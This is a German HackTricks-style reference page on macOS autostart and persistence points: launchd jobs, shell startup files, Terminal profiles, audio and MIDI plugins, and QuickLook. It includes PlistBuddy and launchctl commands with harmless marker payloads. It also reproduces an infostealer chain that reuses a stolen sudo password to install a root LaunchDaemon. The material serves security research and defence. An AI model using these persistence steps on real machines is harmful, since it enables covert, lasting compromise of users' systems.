# macOS-Autostart

{{#include ../banners/hacktricks-training.md}}

Dieser Abschnitt basiert größtenteils auf der Blogserie [**Beyond the good ol' LaunchAgents**](https://theevilbit.github.io/beyond/). Ziel ist es, Speicherorte zu identifizieren, an denen ein Schreibzugriff später zur Codeausführung führen kann, welches Ereignis die Ausführung auslöst und welche Berechtigungen erforderlich sind. Dass ein Speicherort vorhanden ist, beweist nicht, dass der Mechanismus aktiviert ist. Die unten aufgeführten lokalen Prüfungen wurden unter macOS 26.5.2 (5. Oktober 2026) durchgeführt; sie belegen nicht das Verhalten jeder macOS-Version.

> [!NOTE]
> „Durch Schreiben ausgelöst“ bedeutet nicht immer, dass etwas „unmittelbar nach dem Schreiben ausgeführt wird“. Manche Speicherorte werden erst bei der Anmeldung, beim Start einer bestimmten Anwendung oder nach einer Aktion des Benutzers ausgelesen. Ein beschreibbarer Payload innerhalb eines bereits konfigurierten Jobs ist außerdem etwas anderes als die Berechtigung, einen neuen Job zu registrieren. Teste eine Technik, bevor du dich auf sie verlässt, in einem entbehrlichen Benutzerkonto oder einer VM.

## Sandbox Bypass

> [!TIP]
> Hier findest du Startorte, die für einen **Sandbox Bypass** nützlich sind und es ermöglichen, etwas einfach auszuführen, indem du es **in eine Datei schreibst** und auf eine **sehr** **gewöhnliche** Aktion, eine bestimmte **Zeitspanne** oder eine **Aktion, die du normalerweise ausführen kannst**, wartest – und das innerhalb einer Sandbox, ohne Root-Berechtigungen zu benötigen.

### Launchd

- Nützlich für Sandbox Bypass: [✅](https://emojipedia.org/check-mark-button)
- TCC Bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Speicherorte

- **`/Library/LaunchAgents`**
  - **Auslöser**: Benutzeranmeldung (oder explizite Registrierung)
  - Root erforderlich
- **`/Library/LaunchDaemons`**
  - **Auslöser**: Systemstart (oder explizite Registrierung)
  - Root erforderlich
- **`/System/Library/LaunchAgents`**
  - **Auslöser**: Benutzeranmeldung; geschützter Apple-Systemspeicherort
- **`/System/Library/LaunchDaemons`**
  - **Auslöser**: Systemstart; geschützter Apple-Systemspeicherort
- **`~/Library/LaunchAgents`**
  - **Auslöser**: Erneute Anmeldung

Es gibt keinen von `launchd` durchsuchten Speicherort `~/Library/LaunchDaemons`. Per-User-Jobs gehören in `~/Library/LaunchAgents`; das System-Daemon-Verzeichnis ist `/Library/LaunchDaemons`. Apples [Startanleitung für launchd](https://developer.apple.com/library/archive/documentation/MacOSX/Conceptual/BPSystemStartup/Chapters/CreatingLaunchdJobs.html) dokumentiert die durchsuchten Speicherorte.

> [!TIP]
> Interessanterweise enthält **`launchd`** in einem Mach-o-Abschnitt `__Text.__config` eine eingebettete Property List mit weiteren bekannten Diensten, die launchd starten muss. Außerdem können diese Dienste `RequireSuccess`, `RequireRun` und `RebootOnSuccess` enthalten. Das bedeutet, dass sie ausgeführt werden und erfolgreich abschließen müssen.
>
> Natürlich kann sie aufgrund der Code-Signierung nicht geändert werden.

#### Beschreibung & Ausnutzung

**`launchd`** ist der **erste** **Prozess**, den der OX S-Kernel beim Start ausführt, und der letzte, der beim Herunterfahren beendet wird. Seine **PID** sollte immer **1** sein. Dieser Prozess **liest und führt** die in den **ASEP**-**Plists** angegebenen Konfigurationen aus:

- `/Library/LaunchAgents`: Vom Administrator installierte Per-User-Agents
- `/Library/LaunchDaemons`: Vom Administrator installierte systemweite Daemons
- `/System/Library/LaunchAgents`: Von Apple bereitgestellte Per-User-Agents.
- `/System/Library/LaunchDaemons`: Von Apple bereitgestellte systemweite Daemons.

Wenn sich ein Benutzer anmeldet, lädt `launchd` die Plists in dessen `~/Library/LaunchAgents` mit den Berechtigungen dieses Benutzers. Jobs werden entsprechend ihren Schlüsseln gestartet; das bloße Laden einer Plist bedeutet nicht, dass der Prozess sofort ausgeführt wird.

**Der Hauptunterschied zwischen Agents und Daemons besteht darin, dass Agents beim Anmelden des Benutzers und Daemons beim Systemstart geladen werden** (denn Dienste wie ssh müssen ausgeführt werden, bevor ein Benutzer auf das System zugreift). Außerdem können Agents eine GUI verwenden, während Daemons im Hintergrund laufen müssen.

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
        <string>com.apple.someidentifier</string>
    <key>ProgramArguments</key>
    <array>
        <string>/bin/sh</string>
        <string>-c</string>
        <string>touch /tmp/launched</string>
    </array>
    <key>RunAtLoad</key><true/> <!--Execute at system startup-->
    <key>StartInterval</key>
    <integer>800</integer> <!--Execute each 800s-->
    <key>KeepAlive</key>
    <dict>
        <key>SuccessfulExit</key><false/> <!--Re-execute if exit unsuccessful-->
        <!--If previous is true, then re-execute in successful exit-->
    </dict>
</dict>
</plist>
```

Jedes `ProgramArguments`-Element ist ein separates Argument; `launchd` interpretiert keine einzelne Zeichenfolge als Shell-Befehl. Das oben korrigierte Beispiel lässt sich mit `plutil -lint /path/to/example.plist` auf Syntaxfehler prüfen, ohne es zu laden. Siehe den lokalen Eintrag `man launchd.plist` zu `ProgramArguments`, `RunAtLoad` und `KeepAlive`.

#### Dateiereignis-Trigger in bestehenden Jobs

Ein **bereits geladener** Agent oder Daemon kann `WatchPaths` verwenden, um beim Ändern eines angegebenen Pfads zu starten. `QueueDirectories` startet einen Job, solange ein Verzeichnis nicht leer ist; `StartOnMount` startet ihn beim Einhängen eines Volumes. [Apples launchd-Anleitung](https://developer.apple.com/library/archive/documentation/MacOSX/Conceptual/BPSystemStartup/Chapters/CreatingLaunchdJobs.html#//apple_ref/doc/uid/10000172i-CH2-SW9) enthält Beispiele für `WatchPaths` und `QueueDirectories`. Ein Schreibvorgang in eine überwachte Datei löst den **bereits konfigurierten Job** aus; beliebige Codeausführung ist dadurch nur möglich, wenn der Schreibende auch die ausführbare Datei, das Skript oder die vom Job interpretierten Daten kontrollieren kann. Das bloße Schreiben einer neuen plist-Datei außerhalb eines durchsuchten oder registrierten Speicherorts lädt sie nicht.

Dieser selbstbereinigende PoC registriert einen eindeutig benannten **temporären Benutzer-Agenten**, ändert nur seine eigene überwachte Datei und entfernt den Agenten anschließend. Er wurde unter macOS 26.5.2 erfolgreich ausgeführt, ohne Abmeldung oder Neustart:

```python
import os, pathlib, plistlib, subprocess, tempfile, time, uuid

label = f"org.hacktricks.watchtest.{uuid.uuid4().hex}"
target = f"gui/{os.getuid()}"
with tempfile.TemporaryDirectory(prefix="ht-watch-") as root:
    base = pathlib.Path(root)
    watched, marker, plist = base / "watched", base / "ran", base / "agent.plist"
    watched.write_text("before\n")
    plist.write_bytes(plistlib.dumps({
        "Label": label,
        "ProgramArguments": ["/usr/bin/touch", str(marker)],
        "WatchPaths": [str(watched)],
        "RunAtLoad": False,
    }))
    subprocess.run(["launchctl", "bootstrap", target, str(plist)], check=True)
    try:
        marker.unlink(missing_ok=True)
        watched.write_text("after\n")
        for _ in range(30):
            if marker.exists():
                break
            time.sleep(0.1)
        print("watch fired:", marker.exists())
    finally:
        subprocess.run(["launchctl", "bootout", f"{target}/{label}"], check=True)
```

Der lokale Lauf gab `watch fired: True` aus, und `bootout` war erfolgreich. `launchctl bootstrap` wird hier nur innerhalb des isolierten PoC verwendet; für einen bereits geladenen Job ist es **nicht** erforderlich. Um einen bestehenden Job sicher zu überprüfen, lies seine plist-Datei und den aufgelösten Pfad von `ProgramArguments` aus und prüfe, ob die betreffende ausführbare Datei oder interpretierte Datei beschreibbar ist, ohne sie zu verändern.

Es gibt Fälle, in denen ein **Agent ausgeführt werden muss, bevor sich der Benutzer anmeldet**. Diese werden **PreLoginAgents** genannt. Das ist beispielsweise nützlich, um beim Anmelden assistive technology bereitzustellen. Sie sind auch in `/Library/LaunchAgents` zu finden (siehe [**hier**](https://github.com/HelmutJ/CocoaSampleCode/tree/master/PreLoginAgents) ein Beispiel).

> [!TIP]
> Neue Konfigurationsdateien für Daemons oder Agents werden **nach dem nächsten Neustart oder mit** `launchctl load <target.plist>` **geladen**. Es ist **auch möglich, .plist-Dateien ohne diese Erweiterung zu laden**: `launchctl -F <file>` (diese plist-Dateien werden jedoch nach einem Neustart nicht automatisch geladen).\
> Es ist auch möglich, sie mit `launchctl unload <target.plist>` **zu entladen** (der dadurch angegebene Prozess wird beendet),
>
> Um **sicherzustellen**, dass **nichts** (wie etwa ein Override) **einen Agent oder Daemon daran hindert**, **ausgeführt zu werden**, führe Folgendes aus: `sudo launchctl load -w /System/Library/LaunchDaemons/com.apple.smdb.plist`

Liste alle Agents und Daemons auf, die vom aktuellen Benutzer geladen wurden:

```bash
launchctl list
```

#### Beispiel einer bösartigen LaunchDaemon-Kette (Wiederverwendung von Passwörtern)

Ein aktueller macOS-Infostealer verwendete ein **erbeutetes sudo-Passwort**, um einen user agent und einen Root-LaunchDaemon abzulegen:<sup>[[1]](#references)</sup>

- Schreibe die Agent-Schleife nach `~/.agent` und mache sie ausführbar.
- Erzeuge eine plist in `/tmp/starter`, die auf diesen Agent verweist.
- Verwende das gestohlene Passwort erneut mit `sudo -S`, um die Datei nach `/Library/LaunchDaemons/com.finder.helper.plist` zu kopieren, `root:wheel` festzulegen und sie mit `launchctl load` zu laden.
- Starte den Agent still mit `nohup ~/.agent >/dev/null 2>&1 &`, um die Ausgabe abzutrennen.

```bash
printf '%s\n' "$pw" | sudo -S cp /tmp/starter /Library/LaunchDaemons/com.finder.helper.plist
printf '%s\n' "$pw" | sudo -S chown root:wheel /Library/LaunchDaemons/com.finder.helper.plist
printf '%s\n' "$pw" | sudo -S launchctl load /Library/LaunchDaemons/com.finder.helper.plist
nohup "$HOME/.agent" >/dev/null 2>&1 &
```
> [!WARNING]
> Eine Daemon-Plist in `/Library/LaunchDaemons` wird nicht dadurch sicher, dass sie dem Benutzer gehört. `launchd` erfordert für Systemjobs geeignete Eigentümer und Berechtigungen und kann eine unsichere Plist ablehnen. Ein Daemon im Besitz von root läuft normalerweise als root, sofern seine Konfiguration kein anderes Konto festlegt. Prüfe den Job auf `UserName`, `GroupName`, Eigentümer und `launchctl`-Diagnosen; leite die Ausführungsidentität nicht allein aus dem Namen des Plist-Eigentümers ab.

#### Weitere Informationen zu launchd

**`launchd`** ist der **erste** Prozess im **Benutzermodus**, der vom **Kernel** gestartet wird. Der Prozessstart muss **erfolgreich** sein und der Prozess **darf nicht beendet werden oder abstürzen**. Er ist sogar gegen bestimmte **Beendigungssignale geschützt**.

Zu den ersten Aufgaben von `launchd` gehört es, alle **Daemons** zu **starten**, zum Beispiel:

- **Timer-Daemons**, die zeitbasiert ausgeführt werden:
  - `com.apple.atrun.plist` startet unter macOS 26.5.2 `/usr/libexec/atrun` mit `StartInterval = 30` Sekunden; der tatsächlich aktivierte Zustand kann vom Wert des Schlüssels `Disabled` in der Plist abweichen, da launchd Überschreibungen separat speichert.
  - `com.vix.cron.plist` startet `/usr/sbin/cron`, wenn `/usr/lib/cron/tabs` Jobs enthält. `com.apple.systemstats.daily` ist ein anderer geplanter Dienst, nicht der cron-Daemon.
- **Netzwerk-Daemons** wie:
  - `org.cups.cups-lpd`: Lauscht über TCP (`SockType: stream`) mit `SockServiceName: printer`
    - SockServiceName muss entweder ein Port oder ein Dienst aus `/etc/services` sein
  - `com.apple.xscertd.plist`: Lauscht an TCP-Port 1640
- **Pfad-Daemons**, die ausgeführt werden, wenn sich ein bestimmter Pfad ändert:
  - `com.apple.postfix.master`: Überwacht den Pfad `/etc/postfix/aliases`
- **IOKit-Benachrichtigungs-Daemons**:
  - `com.apple.xartstorageremoted`: `"com.apple.iokit.matching" => { "com.apple.device-attach" => { "IOMatchLaunchStream" => 1 ...`
- **Mach-Port:**
  - `com.apple.xscertd-helper.plist`: Im Eintrag `MachServices` wird der Name `com.apple.xscertd.helper` angegeben
- **UserEventAgent:**
  - Dieser unterscheidet sich vom vorherigen Beispiel. Er veranlasst launchd, als Reaktion auf bestimmte Ereignisse Apps zu starten. In diesem Fall ist jedoch nicht `launchd`, sondern `/usr/libexec/UserEventAgent` die Haupt-Binärdatei. Sie lädt Plugins aus dem durch SIP geschützten Verzeichnis /System/Library/UserEventPlugins/. Jedes Plugin gibt seinen Initialisierer im Schlüssel `XPCEventModuleInitializer` an oder bei älteren Plugins im Dictionary `CFPluginFactories` unter dem Schlüssel `FB86416D-6164-2070-726F-70735C216EC0` der Datei `Info.plist`.

### Shell-Startdateien

Writeup: [https://theevilbit.github.io/beyond/beyond_0001/](https://theevilbit.github.io/beyond/beyond_0001/)<sup>[[2]](#references)</sup>\
Writeup (xterm): [https://theevilbit.github.io/beyond/beyond_0018/](https://theevilbit.github.io/beyond/beyond_0018/)<sup>[[3]](#references)</sup>

- Nützlich, um die Sandbox zu umgehen: [✅](https://emojipedia.org/check-mark-button)
- TCC-Bypass: [✅](https://emojipedia.org/check-mark-button)
  - Dafür musst du jedoch eine App mit einem TCC-Bypass finden, die eine Shell startet, welche diese Dateien lädt.

#### Speicherorte

- **`~/.zshenv`** (oder eine neuere kompilierte **`~/.zshenv.zwc`**)
  - **Auslöser**: Jeder gewöhnliche zsh-Aufruf, einschließlich eines nicht interaktiven `zsh -c`; `zsh -f` überspringt benutzerdefinierte Startdateien.
- **`~/.zshrc`**
  - **Auslöser**: Eine interaktive zsh wird gestartet.
- **`~/.zprofile`, `~/.zlogin`**
  - **Auslöser**: Eine Login-zsh wird gestartet; diese Dateien werden jeweils vor und nach `.zshrc` gelesen.
- **`/etc/zshenv`, `/etc/zprofile`, `/etc/zshrc`, `/etc/zlogin`**
  - **Auslöser**: Ein Terminal mit zsh öffnen
  - Root erforderlich
- **`~/.zlogout`**
  - **Auslöser**: Eine Login-zsh wird regulär beendet, nicht bei jedem Beenden eines Terminals oder einer Shell.
- **`/etc/zlogout`**
  - **Auslöser**: Ein Terminal mit zsh beenden
  - Root erforderlich
- Möglicherweise weitere Informationen unter: **`man zsh`**
- **`~/.bashrc`**
  - **Auslöser**: Eine interaktive **Nicht-Login**-Bash starten. Eine interaktive Login-Bash liest diese Datei nur, wenn eine Login-Datei sie explizit einbindet.
- **`~/.bash_profile`, `~/.bash_login`, `~/.profile`**
  - **Auslöser**: Eine Login-Bash starten; die erste lesbare Datei in dieser Reihenfolge wird ausgeführt. `~/.profile` wird übersprungen, wenn eine der beiden vorherigen Dateien existiert.
- **`/etc/profile`**
  - **Auslöser**: Eine Login-Bash starten; zum Ändern ist Root erforderlich.
- **`~/.tcshrc`** oder, falls nicht vorhanden, **`~/.cshrc`**
  - **Auslöser**: `tcsh` starten, auch ein nicht interaktives `tcsh -c` auf diesem Mac. Der Benutzer muss tatsächlich `tcsh` aufrufen; es ist nicht die standardmäßige macOS-Shell.
- **`~/.login`**
  - **Auslöser**: Eine Login-`tcsh` starten, nachdem ihre rc-Datei verarbeitet wurde.
- `~/.xinitrc`, `~/.xserverrc`, `/opt/X11/etc/X11/xinit/xinitrc.d/`
  - **Auslöser**: Es wird erwartet, dass sie mit xterm ausgeführt werden, aber xterm **ist nicht installiert**. Auch nach der Installation wird dieser Fehler ausgegeben: xterm: `DISPLAY is not set`<sup>[[3]](#references)</sup>

#### Beschreibung & Ausnutzung

Beim Starten einer Shell-Umgebung wie `zsh` oder `bash` werden **bestimmte Startdateien ausgeführt**. macOS verwendet derzeit `/bin/zsh` als Standard-Shell. Ob Terminal oder SSH eine Login- oder interaktive Shell startet, hängt von deren Konfiguration ab; gehe nicht davon aus, dass in jeder Sitzung alle oben genannten Dateien ausgeführt werden. Zwar sind `bash` und `sh` ebenfalls in macOS vorhanden, sie müssen jedoch explizit aufgerufen werden, um sie zu verwenden.<sup>[[2]](#references)</sup> Die [zsh-Referenz zu Startdateien](https://zsh.sourceforge.io/Doc/Release/Files.html) beschreibt die Reihenfolge, die `ZDOTDIR`-Überschreibung und die `.zwc`-Regel.

Das folgende schreibgeschützte Experiment verwendete ein temporäres `ZDOTDIR` unter macOS 26.5.2. Es zeigt, welche Benutzerdateien gelesen wurden; keine echten Shell-Startdateien wurden geändert:

```bash
lab=$(mktemp -d)
for name in zshenv zprofile zshrc zlogin zlogout; do
  printf 'print -r -- %s >> "$ZDOTDIR/seen"\n' "$name" > "$lab/.$name"
done
for flags in -c -ic -lc -lic; do
  : > "$lab/seen"
  ZDOTDIR="$lab" /bin/zsh "$flags" ':'
  printf '%s: %s\n' "$flags" "$(tr '\n' ' ' < "$lab/seen")"
done
rm -r "$lab"
```

The observed order was `-c`: `zshenv`; `-ic`: `zshenv zshrc`; `-lc`: `zshenv zprofile zlogin`; `-lic`: `zshenv zprofile zshrc zlogin zlogout`. `ZDOTDIR` muss bereits auf das alternative Verzeichnis zeigen; Dateien einfach in einem beliebigen Verzeichnis abzulegen, reicht nicht aus.

[Bash's startup reference](https://www.gnu.org/software/bash/manual/html_node/Bash-Startup-Files.html) unterscheidet zwischen Login- und interaktiven Shells. Auf dem macOS-26.5.2-Testsystem ergab ein isoliertes `HOME` mit allen vier Benutzer-Startup-Dateien Folgendes: `bash -c` → keine, `bash -ic` → `.bashrc`, `bash -lc` und `bash -lic` → nur `.bash_profile`. Nach dem Entfernen von `.bash_profile` las Login-Bash `.bash_login` und, nachdem auch diese Datei entfernt worden war, `.profile`. `BASH_ENV` kann nichtinteraktive Bash auf eine Datei verweisen, aber diese Umgebungsvariable muss bereits im aufrufenden Prozess gesetzt sein. Ein explizites `exit` aus einer Login-Bash kann außerdem `~/.bash_logout` laden.

Das lokale Handbuch `tcsh(1)` dokumentiert eine eigene Startreihenfolge. Mit einem temporären `HOME` las `/bin/tcsh -c :` `.tcshrc` oder, wenn `.tcshrc` nicht vorhanden war, `.cshrc`. Eine temporäre Login-`tcsh` las `.tcshrc` und `.login`. Bei diesen Prüfungen wurden ausschließlich temporäre Dateien erstellt und entfernt.

### Erneut geöffnete Apps

> [!CAUTION]
> Das Konfigurieren der angegebenen Ausnutzung und anschließende Ab- und erneute Anmelden oder sogar ein Neustart führten beim Test nicht dazu, dass die App ausgeführt wurde. Möglicherweise muss die App während dieser Aktionen laufen.

**Writeup**: [https://theevilbit.github.io/beyond/beyond_0021/](https://theevilbit.github.io/beyond/beyond_0021/)<sup>[[4]](#references)</sup>

- Nützlich zum Umgehen der Sandbox: [✅](https://emojipedia.org/check-mark-button)
- TCC-Umgehung: [🔴](https://emojipedia.org/large-red-circle)

#### Speicherort

- **`~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist`**
  - **Auslöser**: Neustart, bei dem Apps erneut geöffnet werden

#### Beschreibung & Ausnutzung

Alle erneut zu öffnenden Apps befinden sich in der plist `~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist`<sup>[[4]](#references)</sup>

Damit die erneut zu öffnenden Apps deine eigene App starten, musst du sie einfach **zur Liste hinzufügen**.

Die UUID lässt sich durch Auflisten dieses Verzeichnisses oder mit `ioreg -rd1 -c IOPlatformExpertDevice | awk -F'"' '/IOPlatformUUID/{print $4}'` ermitteln.

Um die Apps zu prüfen, die erneut geöffnet werden, kannst du Folgendes ausführen:

```bash
defaults -currentHost read com.apple.loginwindow TALAppsToRelaunchAtLogin
#or
plutil -p ~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist
```

Um **eine Anwendung zu dieser Liste hinzuzufügen**, können Sie Folgendes verwenden:

```bash
# Adding iTerm2
/usr/libexec/PlistBuddy -c "Add :TALAppsToRelaunchAtLogin: dict" \
    -c "Set :TALAppsToRelaunchAtLogin:$:BackgroundState 2" \
    -c "Set :TALAppsToRelaunchAtLogin:$:BundleID com.googlecode.iterm2" \
    -c "Set :TALAppsToRelaunchAtLogin:$:Hide 0" \
    -c "Set :TALAppsToRelaunchAtLogin:$:Path /Applications/iTerm.app" \
    ~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist
```

### Terminal-Einstellungen

Writeup: [https://theevilbit.github.io/beyond/beyond_0020/](https://theevilbit.github.io/beyond/beyond_0020/)<sup>[[5]](#references)</sup>

- Nützlich, um die Sandbox zu umgehen: [✅](https://emojipedia.org/check-mark-button)
- TCC-Umgehung: [✅](https://emojipedia.org/check-mark-button)
  - Terminal verwendet die FDA-Berechtigungen des Benutzers

#### Speicherort

- **`~/Library/Preferences/com.apple.Terminal.plist`**
  - **Auslöser**: Ein neues Terminal-Fenster oder ein neuer Tab wird mit dem Profil geöffnet, dessen Shell-Einstellungen den Startbefehl enthalten

#### Beschreibung & Ausnutzung

In **`~/Library/Preferences`** werden die Einstellungen des Benutzers für die Apps gespeichert. Einige dieser Einstellungen können eine Konfiguration zum **Ausführen anderer Apps/Skripte** enthalten.<sup>[[5]](#references)</sup>

Beispielsweise kann Terminal beim Start einen Befehl ausführen:

<figure><img src="../images/image (1148).png" alt="" width="495"><figcaption></figcaption></figure>

Diese Konfiguration wird in der Datei **`~/Library/Preferences/com.apple.Terminal.plist`** wie folgt abgebildet:

```bash
[...]
"Window Settings" => {
    "Basic" => {
      "CommandString" => "touch /tmp/terminal_pwn"
      "Font" => {length = 267, bytes = 0x62706c69 73743030 d4010203 04050607 ... 00000000 000000cf }
      "FontAntialias" => 1
      "FontWidthSpacing" => 1.004032258064516
      "name" => "Basic"
      "ProfileCurrentVersion" => 2.07
      "RunCommandAsShell" => 0
      "type" => "Window Settings"
    }
[...]
```

Wenn das betreffende Profil einen Startbefehl enthält und Terminal diese Einstellung ausliest, kann eine neue Sitzung mit diesem Profil ihn ausführen. [Apples aktueller Terminal-Leitfaden](https://support.apple.com/guide/terminal/trmlshll/mac) beschreibt den profilbezogenen Startbefehl unter **Shell → Startup**. Terminal einfach zu öffnen, ohne eine neue Sitzung mit diesem Profil zu starten, reicht nicht aus. Die unten aufgeführten Einstellungsänderungen wurden **nicht** auf dem Forschungs-Mac vorgenommen.

Du kannst dies über die CLI hinzufügen mit:

```bash
# Add
/usr/libexec/PlistBuddy -c "Set :\"Window Settings\":\"Basic\":\"CommandString\" 'touch /tmp/terminal-start-command'" $HOME/Library/Preferences/com.apple.Terminal.plist
/usr/libexec/PlistBuddy -c "Set :\"Window Settings\":\"Basic\":\"RunCommandAsShell\" 0" $HOME/Library/Preferences/com.apple.Terminal.plist

# Remove
/usr/libexec/PlistBuddy -c "Set :\"Window Settings\":\"Basic\":\"CommandString\" ''" $HOME/Library/Preferences/com.apple.Terminal.plist
```

### Terminal-Skripte / andere Dateierweiterungen

- Nützlich zum Umgehen der Sandbox: [✅](https://emojipedia.org/check-mark-button)
- TCC-Bypass: [✅](https://emojipedia.org/check-mark-button)
  - Die Verwendung von Terminal kann die FDA-Berechtigungen des Benutzers nutzen

#### Speicherort

- **Beliebig**
  - **Auslöser**: Öffnen der betreffenden `.terminal`-, `.command`- oder `.tool`-Datei

#### Beschreibung & Ausnutzung

Wenn ein Benutzer eine **`.terminal`**-Einstellungsdatei öffnet, kann Terminal anhand ihres Profils eine Sitzung erstellen; ausführbare **`.command`**- und **`.tool`**-Dateien können ebenfalls in Terminal geöffnet werden. Dies ist ein expliziter Auslöser durch das Öffnen einer Datei, keine Ausführung allein durch das Öffnen von Terminal. Ein etwaiger geerbter TCC-Zugriff hängt von den tatsächlichen Berechtigungen von Terminal und der versuchten Aktion ab. Das historische Beispiel unten wurde nicht auf dem Forschungs-Mac ausgeführt.

Probiere es aus mit:

```bash
# Prepare the payload
cat > /tmp/test.terminal << EOF
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
	<key>CommandString</key>
	<string>/usr/bin/touch /tmp/ht-terminal-file-marker</string>
	<key>ProfileCurrentVersion</key>
	<real>2.0600000000000001</real>
	<key>RunCommandAsShell</key>
	<false/>
	<key>name</key>
	<string>exploit</string>
	<key>type</key>
	<string>Window Settings</string>
</dict>
</plist>
EOF

# Trigger it
open /tmp/test.terminal

# After inspecting the marker, remove the disposable file and marker:
rm -f /tmp/test.terminal /tmp/ht-terminal-file-marker
```

Du könntest auch die Erweiterungen **`.command`**, **`.tool`** mit regulärem Shell-Skript-Inhalt verwenden; sie werden ebenfalls von Terminal geöffnet.

> [!CAUTION]
> Wenn Terminal **Full Disk Access** hat, kann es diese Aktion ausführen (beachte, dass der ausgeführte Befehl in einem Terminalfenster sichtbar ist).

### Audio-Plugins

Write-up: [https://theevilbit.github.io/beyond/beyond_0013/](https://theevilbit.github.io/beyond/beyond_0013/)<sup>[[6]](#references)</sup>\
Write-up: [https://posts.specterops.io/audio-unit-plug-ins-896d3434a882](https://posts.specterops.io/audio-unit-plug-ins-896d3434a882)<sup>[[7]](#references)</sup>

- Nützlich zum Umgehen der Sandbox: [✅](https://emojipedia.org/check-mark-button)
- TCC-Umgehung: [🟠](https://emojipedia.org/large-orange-circle)
  - Möglicherweise erhältst du zusätzlichen TCC-Zugriff

#### Speicherorte

- **`/Library/Audio/Plug-Ins/HAL`**
  - Root erforderlich
  - **Auslöser**: Der Core Audio-Server lädt ein kompatibles HAL-Geräte-Plugin; ein Neustart des Servers kann eine erneute Suche auslösen
- **`/Library/Audio/Plug-ins/Components`**
  - Root erforderlich
  - **Auslöser**: Ein Audio-Host entdeckt und instanziiert die installierte Audio Unit
- **`~/Library/Audio/Plug-ins/Components`**
  - **Auslöser**: Ein Audio-Host entdeckt und instanziiert die installierte Audio Unit
- **`/System/Library/Components`**
  - Von Apple bereitgestellter, systemgeschützter Speicherort
  - **Auslöser**: Ein Audio-Host instanziiert eine passende Systemkomponente

#### Beschreibung

Laut den vorherigen Write-ups ist es möglich, **einige Audio-Plugins zu kompilieren** und laden zu lassen.<sup>[[6]](#references)[[7]](#references)</sup>

HAL-Geräte-Plugins und Audio Units verwenden unterschiedliche Ladepfade. In [Apples Anleitung zum Hosten von Audio Units](https://developer.apple.com/library/archive/documentation/MusicAudio/Conceptual/CoreAudioOverview/ARoadmaptoCommonTasks/ARoadmaptoCommonTasks.html) steht, dass ein Host eine Komponente finden und instanziieren muss; das Kopieren in ein Suchverzeichnis oder ein Neustart von `coreaudiod` allein belegt nicht, dass sie ausgeführt wird. AUv2-Plugins laufen im Host-Prozess, während AUv3 laut [Apples aktueller Anleitung zu Audio Units](https://developer.apple.com/documentation/audiotoolbox/incorporating-audio-effects-and-instruments) unter macOS standardmäßig in einem separaten Prozess läuft. Signatur-, Sandbox- und Library-Validation-Prüfungen hängen vom Host ab. Auf dem Research-Mac wurde kein Audio-Plugin installiert oder ausgeführt.

### CoreMIDI-Treiber (MIDIServer)

Write-up: [https://codecolor.ist/2019/11/21/two-macos-persistence-tricks-abusing-plugins/](https://codecolor.ist/2019/11/21/two-macos-persistence-tricks-abusing-plugins/)<sup>[[53]](#references)</sup>

- Nützlich zum Umgehen der Sandbox: [✅](https://emojipedia.org/check-mark-button)
  - Dein Code läuft innerhalb des `MIDIServer`-Prozesses, nicht in der Sandbox deiner App
- TCC-Umgehung: [🔴](https://emojipedia.org/large-red-circle)
  - `MIDIServer` läuft mit einem eigenen `seatbelt`-Sandbox-Profil

#### Speicherorte

- **`~/Library/Audio/MIDI Drivers/*.plugin`**
  - Kein Root erforderlich (vom Benutzer beschreibbar)
  - **Auslöser**: `MIDIServer` startet (erneut). Er wird bei Bedarf gestartet, sobald ein Prozess CoreMIDI verwendet (beim Öffnen von *Audio-MIDI-Setup*, GarageBand, einer DAW oder einer Seite, die WebMIDI verwendet)
- **`/Library/Audio/MIDI Drivers/*.plugin`**
  - Root erforderlich
  - **Auslöser**: wie oben

#### Beschreibung & Exploitation

Apples `MIDIServer` (`/System/Library/Frameworks/CoreMIDI.framework/MIDIServer`) lädt MIDI-**Treiber**-Bundles aus den Verzeichnissen `Audio/MIDI Drivers`. Die Binärdatei ist von Apple signiert, enthält aber die Berechtigung `com.apple.security.cs.disable-library-validation`. Daher lädt sie auch ein Bundle, das **unsigniert oder ad hoc von einem anderen Team signiert** ist. So wird Codeausführung innerhalb eines separaten, Apple-eigenen Prozesses **ohne Root** möglich.<sup>[[53]](#references)</sup>

Unter macOS 26 überprüft (schreibgeschützt):

```bash
# user-writable, no root needed
ls -ld ~/Library/"Audio/MIDI Drivers"            # exists, owned by the user
codesign -d --entitlements :- /System/Library/Frameworks/CoreMIDI.framework/MIDIServer 2>/dev/null \
  | grep disable-library-validation              # -> com.apple.security.cs.disable-library-validation
```

Ein Treiber ist ein Standard-Bundle, das eine `MIDIDriverInterface`-Factory exportiert. Wird der Payload in der Factory/im Konstruktor platziert, wird er ausgeführt, sobald `MIDIServer` die Treiber auflistet. Erstellen Sie das Bundle, legen Sie es unter `~/Library/Audio/MIDI Drivers/Evil.plugin` ab und lösen Sie einen Ladevorgang ohne Abmeldung oder Neustart aus:

```bash
# starts MIDIServer, which scans the driver directories
open -a "Audio MIDI Setup"
```

### QuickLook-Plugins

Writeup: [https://theevilbit.github.io/beyond/beyond_0012/](https://theevilbit.github.io/beyond/beyond_0012/)<sup>[[8]](#references)</sup>

- Nützlich zum Umgehen der Sandbox: [✅](https://emojipedia.org/check-mark-button)
- TCC-Bypass: [🟠](https://emojipedia.org/large-orange-circle)
  - Möglicherweise erhältst du zusätzlichen TCC-Zugriff

#### Speicherort

- `/System/Library/QuickLook`
- `/Library/QuickLook`
- `~/Library/QuickLook`
- `/Applications/AppNameHere/Contents/Library/QuickLook/`
- `~/Applications/AppNameHere/Contents/Library/QuickLook/`

#### Beschreibung & Ausnutzung

QuickLook-Plugins können ausgeführt werden, wenn du **die Vorschau einer Datei auslöst** (Leertaste drücken, während die Datei im Finder ausgewählt ist) und ein **Plugin installiert ist, das diesen Dateityp unterstützt**.<sup>[[8]](#references)</sup>

